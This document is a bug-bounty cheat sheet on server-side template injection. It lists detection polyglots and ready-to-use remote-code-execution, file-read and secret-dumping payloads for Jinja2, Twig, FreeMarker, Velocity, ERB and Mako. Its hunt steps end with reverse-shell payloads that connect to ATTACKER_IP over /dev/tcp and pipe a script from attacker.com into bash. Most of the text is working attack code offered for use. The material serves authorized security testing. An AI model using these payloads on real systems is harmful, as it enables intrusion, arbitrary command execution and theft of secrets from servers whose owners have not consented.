---
tags: [bugbounty, vuln/ssti, cheatsheet, p1]
aliases: [Server-Side Template Injection, SSTI]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# SSTI — Server-Side Template Injection

> [!tldr] Hunter Summary
> **What:** User input executed by server-side template engine → RCE.
> **Impact:** Remote Code Execution — P1 always.
> **Best targets:** Any field reflected on page, email templates, report generators, error pages.
> **Time to triage:** Inject `{{7*7}}` — see `49` in response = confirmed. 5 min.

---

## Detection Polyglot

Inject this and observe response for math execution:
```
{{7*7}}                 → 49 (Jinja2, Twig, Angular)
${7*7}                  → 49 (FreeMarker, Java EL)
<%= 7*7 %>              → 49 (ERB/Ruby)
#{7*7}                  → 49 (Pebble, Mako)
*{7*7}                  → 49 (Thymeleaf Spring)
{{ ''.__class__ }}      → Python object (Jinja2)
{{7*'7'}}               → 49 or 7777777 (Twig vs Jinja2 disambiguation)
```

---

## Engine-Specific Payloads

### Jinja2 (Python/Flask)
```python
# Detection
{{7*7}}   → 49
{{7*'7'}} → 7777777

# Read files
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# RCE (multiple paths)
{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()}}

# Simpler RCE (if os is importable)
{% import os %}{{os.popen('id').read()}}

# Config dump
{{config}}
{{config.items()}}
{{settings.SECRET_KEY}}
```

### Twig (PHP/Symfony)
```php
# Detection
{{7*7}}   → 49
{{7*'7'}} → 49 (not 7777777 — distinguishes from Jinja2)

# RCE
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# File read
{{'/etc/passwd'|file_get_contents}}
```

### FreeMarker (Java)
```
# Detection
${7*7}  → 49
#{7*7}  → 49

# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}
${product.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke(product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

### Velocity (Java)
```
# RCE
#set($x='')##
#set($rt = $x.class.forName('java.lang.Runtime'))
#set($chr = $x.class.forName('java.lang.Character'))
#set($str = $x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
...
```

### ERB (Ruby on Rails)
```ruby
# Detection
<%= 7*7 %>  → 49

# RCE
<%= `id` %>
<%= system("id") %>
<%= IO.popen('id').readlines() %>
```

### Mako (Python)
```python
# Detection
${7*7}  → 49

# RCE
${__import__('os').popen('id').read()}
<%
import os
x=os.popen('id').read()
%>
${x}
```

---

## Step-by-Step Hunt

### Step 1 — Find injection points
Look for: profile fields, display names, email templates, custom error messages, report generators, any field reflected in page output.

### Step 2 — Inject detection polyglot
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```
If you see `49` in the response = SSTI confirmed.

### Step 3 — Identify the engine
```
{{7*'7'}} → 7777777 = Jinja2 (Python)
{{7*'7'}} → 49 = Twig (PHP)
${7*7} → 49 = FreeMarker/Velocity/Mako (Java/Python)
<%= 7*7 %> → 49 = ERB (Ruby)
```

### Step 4 — Escalate to RCE
Use engine-specific payload above. Try `id`, `whoami`, `cat /etc/passwd`.

### Step 5 — Get reverse shell
```bash
# After confirming RCE, get a shell
# Via Jinja2:
{{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1').read()}}

# Via curl download
{{config.__class__.__init__.__globals__['os'].popen('curl https://attacker.com/shell.sh | bash').read()}}
```

---

## Tools

| Tool | Use |
|------|-----|
| `tplmap` | Automated SSTI detection and exploitation |
| SSTImap | Fork of tplmap, more engines |
| Burp Intruder | Test all fields with detection polyglot |

---

## References

- PortSwigger SSTI — https://portswigger.net/web-security/server-side-template-injection
- James Kettle — Server-Side Template Injection (BlackHat 2015)
- tplmap — https://github.com/epinna/tplmap
